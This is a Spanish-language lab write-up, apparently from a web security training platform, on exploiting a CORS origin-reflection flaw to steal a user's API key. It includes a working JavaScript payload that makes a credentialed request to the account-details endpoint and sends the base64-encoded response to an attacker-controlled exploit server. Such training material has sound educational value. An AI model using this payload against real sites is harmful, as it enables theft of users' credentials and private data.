Ya con la comprobación inicial realizada, nos centramos ahora en desplegar el exploit en el servidor de ataque. El objetivo es automatizar el robo de la clave de API mediante una petición ‘**XMLHttpRequest**‘ con credenciales activadas (**withCredentials**). Si el origen malicioso es reflejado en la respuesta como válido, y se permite el acceso a la respuesta gracias al encabezado ‘**Access-Control-Allow-Origin**‘, el navegador de la víctima nos dejará leer los datos sensibles y redirigirlos al log del exploit server.

Este enfoque demuestra cómo una validación incorrecta del origen puede dejar expuestos endpoints sensibles incluso cuando se ha intentado limitar el acceso con mecanismos CORS mal implementados.

Solucion
si nosotro agregamos origin y una direccion X si le damos a send vemos que nos esta redirigiendo a la pagina web que nosotros pusimos
![Pasted_image_20250728202600.png](/Imagenes/Pasted_image_20250728202600.png)
y esto se presenta como un riesgo ya que esto se puede utilizar para cambiar informacion de modo que si el usuario visita account Details que en realidad es nuestra pagina web nos mande la informacion de apikey
entonces para ello vamos a realizar un script el cual nos de informacion sobre el usuario que queremos obtener su apikey
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        location = "https://exploit-0aa000a0039d1754808d398f01cf00a1.exploit-server.net/?apikey=" + btoa(req.responseText);
    };
    req.open("GET","https://0a65006f036117a580193a9e00d300ad.web-security-academy.net/accountDetails", true);
    req.withCredentials = true;
    req.send();
</script>

Entonces en nuesto exploit server ejecutamos este codigo y nos vamos a los logs
![Pasted_image_20250728204549.png](/Imagenes/Pasted_image_20250728204549.png)
obtuvimos la apikey como lo visualizamos
![Pasted_image_20250728204710.png](/Imagenes/Pasted_image_20250728204710.png)
